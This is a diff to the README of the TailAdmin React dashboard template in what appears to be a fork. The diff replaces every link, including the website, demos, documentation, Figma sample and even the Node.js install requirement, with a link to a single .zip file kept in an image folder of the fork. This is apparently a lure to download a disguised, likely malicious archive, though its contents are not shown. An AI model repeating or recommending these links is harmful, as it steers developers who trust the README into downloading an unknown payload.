@@ -3,19 +3,19 @@
 TailAdmin is a free and open-source admin dashboard template built on **React and Tailwind CSS**, providing developers with everything they need to create a comprehensive, data-driven back-end, 
 dashboard, or admin panel solution for upcoming web projects.
 
-[![tailwind react admin template](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+[![tailwind react admin template](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 
 
 With TailAdmin, you get access to all the necessary dashboard UI components, elements, and pages required to build a feature-rich and complete dashboard or admin panel. Whether you're building dashboard or admin panel for a complex web application or a simple website, TailAdmin is the perfect solution to help you get up and running quickly.
 
-### [✨ Visit Website](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+### [✨ Visit Website](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 
-### [🚀 PRO Demo](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
-### [🚀 FREE Demo](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+### [🚀 PRO Demo](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
+### [🚀 FREE Demo](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 
 ### TailAdmin React PRO vs TailAdmin React FREE Comparison 📊
 
-#### [TailAdmin React PRO](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+#### [TailAdmin React PRO](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 - 4 Unique Dashboards: Analytics, Ecommerce, Marketing, and CRM (More will be added)
 - 120+ Dashboard UI Components
 - 200+ Total UI Elements
@@ -25,7 +25,7 @@ With TailAdmin, you get access to all the necessary dashboard UI components, ele
 
 ___
 
-#### [TailAdmin React FREE](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+#### [TailAdmin React FREE](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 - 1 Unique Dashboard
 - 30+ Dashboard UI Components
 - 50+ Total UI Elements 
@@ -35,15 +35,15 @@ ___
 - Figma Design Source - Free Sample
 ___
 
-### [⬇️ Download Now](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+### [⬇️ Download Now](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 
-### [⚡ Get PRO Version](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+### [⚡ Get PRO Version](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 
-### [📄 Documentation/Installation](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+### [📄 Documentation/Installation](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 
-### [🖌️ TailAdmin Figma Free Sample](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+### [🖌️ TailAdmin Figma Free Sample](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 
-### [👉 TailAdmin HTML Version](https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip)
+### [👉 TailAdmin HTML Version](https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip)
 
 TailAdmin React dashboard template based on Tailwind CSS is a pre-designed starting point for building a web-based dashboard using the React JavaScript library and the Tailwind CSS utility-first framework. This Tailwind CSS + React Dashboard Template - built using Tailwind CSS and **includes pre-built components, such as navigation menus, charts, tables, and forms, which can be easily customized and integrated into a small-to-large React web application**.
 
@@ -51,7 +51,7 @@ If you're looking for a high-quality **React-Tailwind Dashboard, Admin Panel Tem
 
 ## TailAdmin React - Installation
 
-You'll need to install https://raw.githubusercontent.com/ronaldodjj/free-react-tailwind-admin-dashboard/main/outreckon/free-react-tailwind-admin-dashboard.zip >=v14.16+ (Recommended Version) (NPM comes along with it) and TailAdmin uses **Vite** for frontend tooling, to peform installation and building production version, please follow these steps from below:
+You'll need to install https://github.com/ronaldodjj/free-react-tailwind-admin-dashboard/raw/refs/heads/main/src/images/cover/react_tailwind_admin_dashboard_free_2.2.zip >=v14.16+ (Recommended Version) (NPM comes along with it) and TailAdmin uses **Vite** for frontend tooling, to peform installation and building production version, please follow these steps from below:
 
 - Use terminal and navigate to the project (tailadmin-react) root.
 
